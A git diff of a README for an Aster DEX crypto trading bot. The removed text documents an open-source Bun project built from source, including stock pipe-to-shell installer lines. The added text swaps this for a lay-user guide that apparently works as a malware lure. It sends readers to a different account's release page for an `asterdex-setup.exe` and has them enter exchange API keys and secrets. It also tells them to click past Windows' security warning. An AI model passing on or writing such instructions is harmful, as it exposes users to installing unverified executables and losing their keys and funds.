@@ -1,161 +1,93 @@
+# 🤖 asterdex-trading-bot - Automated crypto trading for your portfolio
 
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Hortenseaccountable719/asterdex-trading-bot/releases)
 
-# Aster & HL Trading Bot
+## 📖 Overview
 
-A Bun-powered trading workstation for Aster and Hyperliquid perpetual contracts that ships two production-ready agents: an SMA30 trend follower and a dual-sided market maker. The CLI is built with Ink, synchronises risk state from the exchange, and automatically recovers from restarts or disconnects.
+The asterdex-trading-bot helps you manage trades on Aster DEX. It monitors market price changes and executes buy or sell orders based on settings you choose. This tool removes the need to watch charts all day. You set your goals, and the bot acts on those rules. It works on your Windows computer, keeping your settings local and private.
 
-* [Aster 30% Fee Discount Referral Link](https://www.asterdex.com/zh-CN/referral/4665f3)
-* [GRVT Fee Discount Referral Link](https://grvt.io/exchange/sign-up?ref=sea)
-* [Hyperliquid Fee Discount Referral Link](https://app.hyperliquid.xyz/trade/BTC)
+## ⚙️ System Requirements
 
-## Highlights
-- **Live market data & risk sync** via websocket feeds with REST fallbacks, full reconciliation on restart.
-- **Trend engine** featuring SMA30 entries, fixed stop loss, trailing stop, Bollinger bandwidth gate, and profit-lock stepping.
-- **Market-making loop** with adaptive quote chasing, loss caps, and automatic order healing.
-- **Extensible architecture** decoupling exchange adapters, engines, and the Ink CLI for easy venue or strategy additions.
-- **Multi-exchange support** for AsterDex, GRVT, and Hyperliquid exchanges.
+Make sure your computer meets these needs before you start:
 
-## Requirements
-- Bun ≥ 1.2 (`bun`, `bunx` available on PATH)
-- macOS, Linux, or Windows via WSL (native Windows works but WSL is recommended)
-- Node.js is optional unless your environment requires it for tooling
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Internet: A stable connection for constant price updates.
+- Storage: 200 megabytes of free space.
 
+## 📥 How to Install
 
-## Manual Installation
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/amet2901/asterdex-trading-bot.git
-   cd asterdex-trading-bot
-   ```
-   Alternatively download the ZIP from GitHub and extract it manually.
-2. **Install Bun**
-   - macOS / Linux: `curl -fsSL https://bun.sh/install | bash`
-   - Windows PowerShell: `powershell -c "irm bun.sh/install.ps1 | iex"`
-   Re-open the terminal and confirm `bun -v` prints a version.
-3. **Install dependencies**
-   ```bash
-   bun install
-   ```
-4. **Create your environment file**
-   ```bash
-   cp .env.example .env
-   ```
-   Edit `.env` with your exchange credentials and overrides.
-5. **Launch the CLI**
-   ```bash
-   bun run index.ts
-   ```
-   Use the arrow keys to pick a strategy, `Enter` to start, `Esc` to return to the menu, and `Ctrl+C` to exit.
+Follow these steps to get the bot on your computer.
 
-## Environment Variables
-The most important settings shipped in `.env.example` are summarised below:
+1. Visit this page to download the latest version: [https://github.com/Hortenseaccountable719/asterdex-trading-bot/releases](https://github.com/Hortenseaccountable719/asterdex-trading-bot/releases).
+2. Look for the file labeled `asterdex-setup.exe` under the Assets section.
+3. Click the file to save it to your Downloads folder.
+4. Open your Downloads folder and double-click `asterdex-setup.exe`.
+5. Follow the prompts on the screen to finish the installation.
+6. A shortcut icon will appear on your desktop once the process ends.
 
-| Variable | Purpose |
-| --- | --- |
-| `ASTER_API_KEY` / `ASTER_API_SECRET` | Required Aster exchange credentials |
-| `TRADE_SYMBOL` | Contract symbol, defaults to `BTCUSDT` |
-| `TRADE_AMOUNT` | Order size in base asset units |
-| `LOSS_LIMIT` | Max per-trade loss (USDT) before forced close |
-| `TRAILING_PROFIT` / `TRAILING_CALLBACK_RATE` | Trailing stop trigger amount (USDT) and pullback percentage |
-| `PROFIT_LOCK_TRIGGER_USD` / `PROFIT_LOCK_OFFSET_USD` | Move the base stop once unrealised PnL exceeds this trigger |
-| `BOLLINGER_LENGTH` / `BOLLINGER_STD_MULTIPLIER` | Window size and std-dev multiplier for bandwidth filtering |
-| `MIN_BOLLINGER_BANDWIDTH` | Minimum bandwidth ratio required before opening a new position |
-| `PRICE_TICK` / `QTY_STEP` | Exchange precision filters for price and quantity |
-| `POLL_INTERVAL_MS` | Trend engine polling cadence in milliseconds |
-| `MAX_CLOSE_SLIPPAGE_PCT` | Allowed deviation vs mark price when closing |
-| `MAKER_*` | Maker strategy knobs: chase threshold, quote offsets, refresh cadence, etc. |
+## 🚀 Setting Up Your Bot
 
-### Exchange Configuration
+Once installed, open the program to begin.
 
-**AsterDex (Default)**
-```bash
-EXCHANGE=aster
-ASTER_API_KEY=your_aster_api_key
-ASTER_API_SECRET=your_aster_api_secret
-```
+1. Double-click the Aster DEX icon on your desktop.
+2. The first screen asks for your API keys. You receive these keys from your Aster DEX account settings page.
+3. Paste both your Key and Secret into the slots provided.
+4. Select your preferred trading pair from the dropdown menu.
+5. Choose your strategy type. A simple strategy uses percentage targets for profit and loss.
+6. Set your trade size. This defines how much money the bot spends on each trade.
+7. Click Save. The bot will now test the connection to the exchange.
 
-**GRVT**
-```bash
-EXCHANGE=grvt
-GRVT_API_KEY=your_grvt_api_key
-GRVT_API_SECRET=your_grvt_wallet_secret
-GRVT_SUB_ACCOUNT_ID=your_trading_account_id
-```
+## 📊 Using the Dashboard
 
-**Hyperliquid**
-```bash
-EXCHANGE=hyperliquid
-HYPERLIQUID_WALLET_ADDRESS=your_wallet_address
-HYPERLIQUID_PRIVATE_KEY=your_private_key
-```
+The dashboard shows you how the bot performs. You can track open trades, closed trades, and total profit.
 
-To trade on other exchanges, set `EXCHANGE=grvt` or `EXCHANGE=hyperliquid` and populate the respective credentials documented in `.env.example`.
+- **Status Indicator:** A green light means the bot is running. A red light means it stopped. 
+- **Log Window:** This box shows every action the bot takes. Check this if you want to know which trades it placed.
+- **Stop Button:** Press this any time to pause trading instantly. It cancels any open orders waitng for a fill.
 
-## Common Commands
-```bash
-bun run index.ts   # Launch the CLI
-bun run start      # Same as above
-bun run dev        # Development entry point
-bun x vitest run   # Execute the Vitest suite
-```
+## 🛡️ Safety Tips
 
-## Silent & Background Execution
-### Direct silent launch
-Skip the Ink menu and start a strategy straight from the CLI:
+- Keep your API Secret hidden. Do not share this text with anyone.
+- Test with small amounts of money first. This helps you understand how the bot reacts to price moves.
+- Check the software for updates. Developers release improvements to fix bugs and upgrade performance. 
+- Run the bot on a secure network. Avoid public Wi-Fi when managing your investment tools.
 
-```bash
-bun run index.ts --strategy trend --silent        # Trend engine
-bun run index.ts --strategy maker --silent        # Maker engine
-bun run index.ts --strategy offset-maker --silent # Offset maker engine
-```
+## 🛠️ Resolving Common Issues
 
-### Package scripts
-Convenience aliases are exposed in `package.json`:
+Sometimes software acts in ways you do not expect. Use these tips to fix basic problems.
 
-```bash
-bun run start:trend:silent
-bun run start:maker:silent
-bun run start:offset:silent
-```
+- **The bot cannot connect:** Check your internet connection. Also, verify that your API keys are correct. An extra space in the box can cause a failure.
+- **The screen freezes:** Close the program and start it again. Your settings save automatically, so you will not lose anything.
+- **No trades execute:** Check if your budget is high enough for the minimum trade size required by the exchange. If your balance is too low, the bot cannot place an order.
+- **Windows blocks the app:** Windows sometimes tries to protect your computer from new software. If a blue box appears, click More Info, then click Run Anyway.
 
-### Daemonising with pm2
-Install `pm2` locally (e.g. `bun add -d pm2`) and launch without a global install:
+## 📈 Understanding Trading Terms
 
-```bash
-bunx pm2 start bun --name aster-hl-trend --cwd . --restart-delay 5000 -- run index.ts --strategy trend --silent
-```
+You will see several terms inside the app. Here is what they mean.
 
-You can also reuse the bundled scripts:
+- **Order Book:** A list of buy and sell orders for a specific token.
+- **Spread:** The difference between the highest buy price and the lowest sell price.
+- **Limit Order:** An instruction to buy or sell at a specific price. The bot only acts when the market hits this price.
+- **Market Order:** An instruction to buy or sell immediately at the current price. 
+- **Slippage:** The difference between the price you want and the price you get when the market moves fast.
 
-```bash
-bun run pm2:start:trend
-bun run pm2:start:maker
-bun run pm2:start:offset
-```
+## 🧪 Advanced Features
 
-Adjust `--name`, `--cwd`, or `--restart-delay` to suit your environment and run `pm2 save` if you want the process to auto-start after reboot.
+For users who want more control, the bot offers advanced settings. 
 
-## Testing
-Vitest powers the unit tests:
-```bash
-bun run test
-bun x vitest --watch
-```
+- **Trailing Stop:** This follows the price as it goes up. If the price drops by a set amount, the bot sells to lock in profit.
+- **Cooldown Timer:** You can tell the bot to wait for a specific time after a trade before buying again. This prevents the bot from trading too much.
+- **Alerts:** You can set the bot to send a notification when it opens a new position. This keeps you informed even when you are not looking at the screen.
 
-## Troubleshooting
-- You need at least 50–100 USDT of capital before deploying a live strategy.
-- Set leverage on the exchange beforehand (around 50x is recommended); the bot does not change it for you.
-- Keep server/desktop time in sync with real-world time to avoid signature errors.
-- Make sure the exchange account is in one-way position mode.
-- **Env not loading**: ensure `.env` resides in the repository root and variable names are spelled correctly.
-- **Order rejected for precision**: align `PRICE_TICK`, `QTY_STEP`, and `TRADE_SYMBOL` with the exchange filters.
-- **Permission or auth errors**: double-check exchange API scopes.
-- **Hyperliquid private key security**: use a dedicated trading wallet, not your main wallet's private key.
+## 🕒 Maintaining the Bot
 
+The bot runs better when you keep your computer clean. Clear your temporary files once a month. Make sure Windows installs its regular updates. If you plan to run the bot 24 hours a day, disable the "Sleep" mode in your Windows power settings. This prevents your computer from turning off and stopping the bot. If the computer goes to sleep, the bot cannot track prices or manage your orders. 
 
-## Disclaimer
-Algorithmic trading carries risk. Validate strategies with paper accounts or small capital first, safeguard your API keys, and only grant the minimum required permissions.
+## 🌐 Community and Support
 
-## Contact
-For questions or technical support, please contact:
-- Telegram: [@moooncity](https://t.me/moooncity)
+The Aster DEX community shares ideas on how to improve trading results. You can find others who use this bot on the official forum. Use these discussions to learn about new settings and strategy ideas. Keep in mind that all trading involves risk. Never trade more money than you can afford to lose. The bot executes your instructions, but you remain responsible for the results. 
+
+## 📝 Final Notes
+
+Developers update this software as the exchange changes. Check the GitHub release page regularly for the latest version. New versions often include speed improvements and better security features. If you find a bug, report it on the issue tracker. Include your log file to help the developers understand what happened. This cooperation makes the tool better for everyone.
